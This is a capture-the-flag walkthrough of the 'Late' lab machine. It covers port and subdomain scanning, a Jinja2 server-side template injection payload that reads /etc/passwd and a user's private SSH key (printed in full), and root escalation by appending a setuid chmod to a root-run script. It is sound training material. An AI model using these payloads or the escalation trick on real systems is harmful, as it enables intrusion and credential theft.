![Late.PNG](/assets/Machines/Easy/Late/Late.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.156
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.156
```
**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

3. Visit webpage

![web.PNG](/assets/Machines/Easy/Late/web.PNG)

* This webpage don't have important information.

3. Use wfuzz to search subdomains
* Before this do virtual hosting with webpage 
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Late]
└─| wfuzz -c -t 200 --hc=404 --hh=9461 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.late.htb" http://late.htb/
```

**Output**
```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload 
=====================================================================

000000002:   200        63 L     152 W      2187 Ch     "images" 
```

* Put this subdomain in `/etc/hosts`

![hosts.PNG](/assets/Machines/Easy/Late/hosts.PNG)

* Change the underlined content with red.


4. Visit new webpage

![subdomain.PNG](/assets/Machines/Easy/Late/subdomain.PNG)

* This webpage use **Flask** and I think use Jinja.

5. Test utility of web page

![screenshot.PNG](/assets/Machines/Easy/Late/screenshot.PNG)

6. Upload file and watch the result
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─| cat result.txt                   
<p>Hi, this is a message
</p> 
```

7. Test if webpage is vulnerable to **SSTI** with this `{{7*7}}`
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─| cat results.txt 
<p>49
</p>
```
* Webpage is vulnerable to SSTI, search in [Jinja-SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) how execute a command.

8. Execute a command to show users in system

* Command: `{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}`

**Result**
```bash
<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
```

9. Try to obtain a id_rsa of user **svc_acc**
```bash
<p>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
</p> 
```

10. Login with ssh with id_rsa, remember put permission **600** in this file
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Late]
└─| ssh svc_acc@10.10.11.156 -i id_rsa 
svc_acc@late:~$ whoami
svc_acc
```

11. Cat **user flag**
```bash
svc_acc@late:~$ cat user.txt 
c4ebb53ce3815b937283c58ee0c61600
```

---
---
---

### Privileges Escalation 💀


1. Find files of current user
```bash
svc_acc@late:/var/www/html$ find / -user svc_acc 2>/dev/null | grep -vE "proc|sys|home|run"
```

**Output**
```bash
/usr/local/sbin
/usr/local/sbin/ssh-alert.sh
/dev/pts/0
```

2. Look files, permissions and flags
* **Content**
```bash
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

* **Permissions**
```bash
-rwxr-xr-x 1 svc_acc svc_acc 433 Dec  7 16:45 /usr/local/sbin/ssh-alert.sh
```

* **Flags**
```bash
svc_acc@late:/var/www/html$ lsattr /usr/local/sbin/ssh-alert.sh
-----a--------e--- /usr/local/sbin/ssh-alert.sh
```

* With `flag a` we don't add content with text editor, in this case we can add content in file only in `mode append`. To do that we use `>>`


3. If you use pspy in target machines you lokk the user run file `ssh-alert.sh` is **root** (UID=0)
```bash
2022/12/07 18:24:11 CMD: UID=0    PID=4006   | /bin/bash /usr/local/sbin/ssh-alert.sh
```

4. Add `chmod u+s /bin/bash` in file `/usr/local/sbin/ssh-alert.sh` and log again for run **ssh-alert.sh** and change permission in `/bin/bash`
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Late]
└─| ssh svc_acc@10.10.11.156 -i id_rsa 
```

```bash
svc_acc@late:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

5. Spawn a bash with privileges
```bash
svc_acc@late:/tmp$ bash -p
bash-4.4# whoami
root
```

6. Cat **root flag**
```bash
bash-4.4# cat /root/root.txt 
eb07476d052fcfa7813e4c3e2907ed9a
```